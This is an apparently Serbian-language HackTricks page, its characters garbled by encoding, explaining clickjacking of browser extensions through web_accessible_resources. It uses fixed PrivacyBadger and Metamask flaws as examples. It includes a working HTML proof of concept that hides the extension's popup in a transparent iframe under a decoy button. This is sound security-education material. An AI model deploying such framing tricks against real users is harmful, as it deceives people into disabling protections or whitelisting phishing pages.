# BrowExt - ClickJacking

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije

Ova stranica Ä‡e iskoristiti ClickJacking ranjivost u Browser ekstenziji.\
Ako ne znate Å¡ta je ClickJacking, proverite:

{% content-ref url="../clickjacking.md" %}
[clickjacking.md](../clickjacking.md)
{% endcontent-ref %}

Ekstenzije sadrÅ¾e fajl **`manifest.json`** i taj JSON fajl ima polje `web_accessible_resources`. Evo Å¡ta [Chrome dokumentacija](https://developer.chrome.com/extensions/manifest/web\_accessible\_resources) kaÅ¾e o tome:

> Ovi resursi bi bili dostupni na veb stranici putem URL-a **`chrome-extension://[PACKAGE ID]/[PATH]`**, koji se moÅ¾e generisati pomoÄ‡u metode **`extension.getURL`**. Resursi na dozvoljenoj listi se serviraju sa odgovarajuÄ‡im CORS zaglavljima, tako da su dostupni putem mehanizama kao Å¡to je XHR.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

**`web_accessible_resources`** u browser ekstenziji nisu samo dostupni putem veba; oni takoÄ‘e rade sa inherentnim privilegijama ekstenzije. To znaÄi da imaju moguÄ‡nost da:

- Menjaju stanje ekstenzije
- UÄitavaju dodatne resurse
- Interaguju sa pregledaÄem do odreÄ‘ene mere

MeÄ‘utim, ova funkcionalnost predstavlja sigurnosni rizik. Ako resurs unutar **`web_accessible_resources`** ima znaÄajnu funkcionalnost, napadaÄ bi potencijalno mogao da ugradi ovaj resurs u spoljnu veb stranicu. Nesumnjivi korisnici koji posete ovu stranicu mogu nenamerno aktivirati ovaj ugraÄ‘eni resurs. Takva aktivacija moÅ¾e dovesti do neÅ¾eljenih posledica, u zavisnosti od dozvola i moguÄ‡nosti resursa ekstenzije.

## Primer PrivacyBadger-a

U ekstenziji PrivacyBadger, identifikovana je ranjivost koja se odnosi na `skin/` direktorijum koji je deklarisan kao `web_accessible_resources` na sledeÄ‡i naÄin (Proverite originalni [blog post](https://blog.lizzie.io/clickjacking-privacy-badger.html)):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
Ova konfiguracija dovela je do potencijalnog sigurnosnog problema. Konkretno, datoteka `skin/popup.html`, koja se prikazuje prilikom interakcije sa ikonom PrivacyBadger u pregledaÄu, mogla bi biti ugraÄ‘ena unutar `iframe`-a. Ovo ugraÄ‘ivanje moÅ¾e biti iskoriÅ¡Ä‡eno kako bi se korisnici prevarili da nenamerno kliknu na "OnemoguÄ‡i PrivacyBadger za ovaj sajt". Takvo postupanje bi ugrozilo privatnost korisnika onemoguÄ‡avanjem zaÅ¡tite PrivacyBadger-a i potencijalno izloÅ¾ilo korisnika poveÄ‡anom praÄ‡enju. Vizuelnu demonstraciju ovog napada moÅ¾ete pogledati u primeru video zapisa ClickJacking-a koji je dostupan na [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm).

Da bi se reÅ¡ila ova ranjivost, implementirano je jednostavno reÅ¡enje: uklanjanje `/skin/*` sa liste `web_accessible_resources`. Ova promena efikasno umanjuje rizik osiguravajuÄ‡i da sadrÅ¾aj direktorijuma `skin/` ne moÅ¾e biti pristupan ili manipulisan putem web-pristupaÄnih resursa.

Popravka je jednostavna: **uklonite `/skin/*` iz `web_accessible_resources`**.

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}

</style>

<div id="stuff">
<h1>
Click the button
</h1>
<button id="button">
click me
</button>
</div>

<iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Primer sa Metamaskom

[**Blog post o ClickJacking-u u Metamasku moÅ¾ete pronaÄ‡i ovde**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). U ovom sluÄaju, Metamask je popravio ranjivost proverom da li je koriÅ¡Ä‡eni protokol za pristup bio **`https:`** ili **`http:`** (a ne na primer **`chrome:`**):

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

**JoÅ¡ jedan popravljen ClickJacking** u Metamask ekstenziji bio je taj Å¡to su korisnici mogli **kliknuti da dodaju na belu listu** kada je stranica bila sumnjiva zbog toga Å¡to je imala `â€œweb_accessible_resourcesâ€: [â€œinpage.jsâ€, â€œphishing.htmlâ€]`. PoÅ¡to je ta stranica bila ranjiva na Clickjacking, napadaÄ bi mogao da je zloupotrebi prikazujuÄ‡i neÅ¡to normalno kako bi Å¾rtva kliknula da je doda na belu listu, a da to ne primeti, a zatim se vratiti na stranicu za ribarenje koja Ä‡e biti na beloj listi.

## Primer sa Steam Inventory Helperom

Pogledajte sledeÄ‡u stranicu da biste videli kako je **XSS** u browser ekstenziji povezan sa ranjivoÅ¡Ä‡u **ClickJacking**:

{% content-ref url="browext-xss-example.md" %}
[browext-xss-example.md](browext-xss-example.md)
{% endcontent-ref %}

## Reference

* [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
* [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini da podrÅ¾ite HackTricks:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
